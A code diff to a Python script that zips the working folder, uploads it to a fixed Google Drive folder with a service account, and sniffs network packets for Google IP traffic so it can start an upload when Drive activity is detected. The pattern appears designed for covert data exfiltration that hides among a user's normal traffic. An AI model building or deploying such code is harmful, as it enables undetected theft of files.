@@ -5,6 +5,20 @@ import os
 import zipfile
 import shutil
 
+from googleapiclient.http import MediaFileUpload
+from google.auth.transport.requests import Request
+from googleapiclient.discovery import build
+from google.oauth2 import service_account
+import httplib2
+
+import requests
+import ipaddress
+from scapy.all import sniff, IP, IPv6, UDP
+import json
+
+import time
+import random
+
 def zip_folder_in_parts(folder_path, zip_file_name):
 	# Create a temporary zip file
 	temp_zip_file = zip_file_name + '.zip'
@@ -46,11 +60,6 @@ SCOPES = ['https://www.googleapis.com/auth/drive']
 SERVICE_ACCOUNT_FILE = 'service_account.json'
 PARENT_FOLDER_ID = "1v1Pse9xihZVzLclq0EYIj5K8csW0jJrB"
 
-from googleapiclient.http import MediaFileUpload
-from google.auth.transport.requests import Request
-from googleapiclient.discovery import build
-from google.oauth2 import service_account
-import httplib2
 
 def authenticate():
 	creds = service_account.Credentials.from_service_account_file(SERVICE_ACCOUNT_FILE, scopes=SCOPES)
@@ -89,10 +98,7 @@ def upload_file(file_path):
 	print("Upload complete")
 
 
-import requests
-import ipaddress
-from scapy.all import sniff, IP, IPv6, UDP
-import json
+
 
 # Correct Google IP Ranges URL
 GOOGLE_IP_RANGES_URL = 'https://www.gstatic.com/ipranges/goog.json'
@@ -145,6 +151,15 @@ def start_sniffing():
 	#sniff(prn=packet_callback, store=0)
 	sniff(iface="wlo1", prn=packet_callback, store=0)
 
+def is_google_ip(ip):
+    for network in google_ips:
+        if isinstance(ip, ipaddress.IPv4Address):
+            if ip in network:
+                return True
+        elif isinstance(ip, ipaddress.IPv6Address):
+            if ip in network:
+                return True
+    return False
 
 # Packet callback function to check for Google Drive traffic
 def packet_callback(packet):
@@ -168,8 +183,7 @@ def packet_callback(packet):
 				print("upload detected")
 				prepare_upload()
 
-import time
-import random
+
 
 def prepare_upload():
 	folder_path = './'
